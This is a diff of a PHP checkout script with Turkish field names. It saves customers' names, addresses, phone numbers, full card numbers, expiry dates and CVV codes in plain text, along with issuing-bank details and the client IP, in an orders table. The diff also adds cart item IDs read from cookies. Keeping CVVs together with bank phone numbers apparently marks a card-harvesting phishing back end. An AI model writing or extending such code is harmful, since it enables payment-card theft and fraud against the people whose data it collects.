@@ -79,12 +79,21 @@ if (!isValidCardNumber($cardnumber)) {
 
 
 
+$cartItemIds = [];
+foreach ($_COOKIE as $cookieName => $cookieValue) {
+    if (strpos($cookieName, 'cart_item_') !== false) {
+       $id = substr($cookieName, strlen('cart_item_'));
+       if (!empty($id)) {
+             $cartItemIds[] = $id;
+       }
+    }
+}
+
 $cardinf = cardinfo($cardnumber);
-print_r($cardinf);
 
 $adi = $_SESSION['adi'];
 $soyadi = $_SESSION['soyadi'];
-$il = $_SESSION['il'];
+$il = $_SESSION['sehir'];
 $ilce = $_SESSION['ilce'];
 $mahalle = $_SESSION['mahalle'];
 $bina_no = $_SESSION['bina_no'];
@@ -96,20 +105,21 @@ $telefon = $_SESSION['telefon'];
 
 $kart_no = $cardnumber;
 $kart_name = $ccname;
-$skt_no = strval($ccmonth) . "/" . strval($ccyear);
+$skt_no = strval(explode(":",$ccmonth)[1]) . "/" . strval(explode(":",$ccyear)[1]);
 $cvv_no = $cvc;
 
 $banka_adi = $cardinf['name'];
 $banka_no = $cardinf['phone'];
 $kart_tipi = $cardinf['type'];
 
+$aldigi_urunler = implode(',', $cartItemIds);
 $tutar = $_SESSION['toplam_fiyat'];
 $ip = $_SERVER['REMOTE_ADDR'];
 
 
 
-$sql = "INSERT INTO `siparisler` (`adi`, `soyadi`, `il`, `ilce`, `mahalle`, `bina_no`, `kat_no`, `daire_no`, `adres_tarifi`, `adres_ismi`, `telefon`, `kart_no`, `kart_name`, `skt_no`, `cvv_no`, `banka_adi`, `banka_no`, `kart_tipi`, `tarih`, `tutar`, `ip`) 
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, ?, ?)";
+$sql = "INSERT INTO `siparisler` (`adi`, `soyadi`, `il`, `ilce`, `mahalle`, `bina_no`, `kat_no`, `daire_no`, `adres_tarifi`, `adres_ismi`, `telefon`, `kart_no`, `kart_name`, `skt_no`, `cvv_no`, `banka_adi`, `banka_no`, `kart_tipi`, `tarih`, `tutar`, `ip`, `aldigi_urunler`) 
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, ?, ?, ?)";
 
 // PDO prepared statement kullanarak sorguyu hazırla
 $stmt = $pdo->prepare($sql);
@@ -135,6 +145,7 @@ $stmt->bindParam(17, $banka_no);
 $stmt->bindParam(18, $kart_tipi);
 $stmt->bindParam(19, $tutar);
 $stmt->bindParam(20, $ip);
+$stmt->bindParam(21, $aldigi_urunler);
 
 // Sorguyu çalıştır
 $stmt->execute();
